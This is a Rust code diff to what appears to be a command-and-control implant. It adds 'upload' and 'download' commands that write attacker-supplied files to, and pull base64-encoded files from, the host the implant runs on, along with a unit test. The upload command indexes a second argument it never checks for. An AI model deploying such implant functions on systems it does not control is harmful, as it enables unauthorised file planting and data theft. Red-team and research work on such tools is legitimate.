@@ -1,12 +1,17 @@
-use std::fs::{read, read_dir};
+use std::{
+    fs::{OpenOptions, read, read_dir},
+    io::{BufWriter, Write},
+};
 
 use base64::Engine;
 use base64::engine::general_purpose::STANDARD;
 
-use crate::commands::{CommandMeta, CommandResult, ImplantComand, ImplantContext};
+use crate::commands::{CommandMeta, CommandResult, ImplantCommand, ImplantContext};
 
 pub struct LsCommand;
 pub struct CatCommand;
+pub struct UploadCommand;
+pub struct DownloadCommand;
 
 impl LsCommand {
     const META: CommandMeta = CommandMeta {
@@ -24,7 +29,23 @@ impl CatCommand {
     };
 }
 
-impl ImplantComand for LsCommand {
+impl UploadCommand {
+    const META: CommandMeta = CommandMeta {
+        name: "upload",
+        description: "Upload a file",
+        usage: "upload <file_data> <remote_file_path>",
+    };
+}
+
+impl DownloadCommand {
+    const META: CommandMeta = CommandMeta {
+        name: "download",
+        description: "Download a file",
+        usage: "download <remote_file_path> <local_file_path>",
+    };
+}
+
+impl ImplantCommand for LsCommand {
     fn meta(&self) -> &CommandMeta {
         &Self::META
     }
@@ -82,7 +103,7 @@ impl ImplantComand for LsCommand {
     }
 }
 
-impl ImplantComand for CatCommand {
+impl ImplantCommand for CatCommand {
     fn meta(&self) -> &CommandMeta {
         &Self::META
     }
@@ -94,6 +115,99 @@ impl ImplantComand for CatCommand {
                 output: "usage cat <file_path>".to_string(),
             };
         }
+        let full_path = ctx.resolve_path(&args[0]);
+
+        let output = match read(full_path) {
+            Ok(bytes) => STANDARD.encode(&bytes),
+            Err(err) => {
+                return CommandResult {
+                    success: false,
+                    output: err.to_string(),
+                };
+            }
+        };
+
+        CommandResult {
+            success: true,
+            output,
+        }
+    }
+}
+
+impl ImplantCommand for UploadCommand {
+    fn meta(&self) -> &CommandMeta {
+        &Self::META
+    }
+
+    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
+        if args.is_empty() {
+            return CommandResult {
+                success: false,
+                output: "usage upload <file_data> <file_path>".to_string(),
+            };
+        }
+
+        let Ok(decoded) = STANDARD.decode(&args[0]) else {
+            return CommandResult {
+                success: false,
+                output: "invalid encoding".to_string(),
+            };
+        };
+
+        let file_path = ctx.resolve_path(&args[1]);
+
+        let Ok(file) = OpenOptions::new()
+            .write(true)
+            .truncate(true)
+            .create(true)
+            .open(&file_path)
+        else {
+            return CommandResult {
+                success: false,
+                output: format!("failed to open {}", &file_path),
+            };
+        };
+
+        let mut writer = BufWriter::new(file);
+        match writer.write_all(decoded.as_ref()) {
+            Ok(_) => {}
+            Err(e) => {
+                return CommandResult {
+                    success: false,
+                    output: e.to_string(),
+                };
+            }
+        }
+        match writer.flush() {
+            Ok(_) => {}
+            Err(e) => {
+                return CommandResult {
+                    success: false,
+                    output: e.to_string(),
+                };
+            }
+        }
+
+        CommandResult {
+            success: true,
+            output: "".to_string(),
+        }
+    }
+}
+
+impl ImplantCommand for DownloadCommand {
+    fn meta(&self) -> &CommandMeta {
+        &Self::META
+    }
+
+    fn execute(&self, args: &[String], ctx: &mut ImplantContext) -> CommandResult {
+        if args.is_empty() {
+            return CommandResult {
+                success: false,
+                output: "usage download <file_path>".to_string(),
+            };
+        }
+
         let full_path = ctx.resolve_path(&args[0]);
 
         let output = match read(full_path) {
@@ -164,5 +278,27 @@ mod test {
         let mut ctx = test_context();
         let result = cmd.execute(&["im_totally_invalid.txt".to_string()], &mut ctx);
         assert_eq!(result.success, false);
+    }
+
+    #[test]
+    fn test_upload_and_download_file() {
+        let path = std::env::temp_dir().join("test.txt");
+        let cmd = UploadCommand;
+        let download = DownloadCommand;
+        let mut ctx = test_context();
+
+        let encoded = "SGVsbG8=".to_string();
+
+        let result = cmd.execute(
+            &[encoded.clone(), path.to_string_lossy().to_string()],
+            &mut ctx,
+        );
+        assert_eq!(result.success, true);
+
+        let result = download.execute(&[path.to_string_lossy().to_string()], &mut ctx);
+        assert_eq!(result.success, true);
+        assert_eq!(result.output, encoded);
+
+        std::fs::remove_file(&path).unwrap();
     }
 }
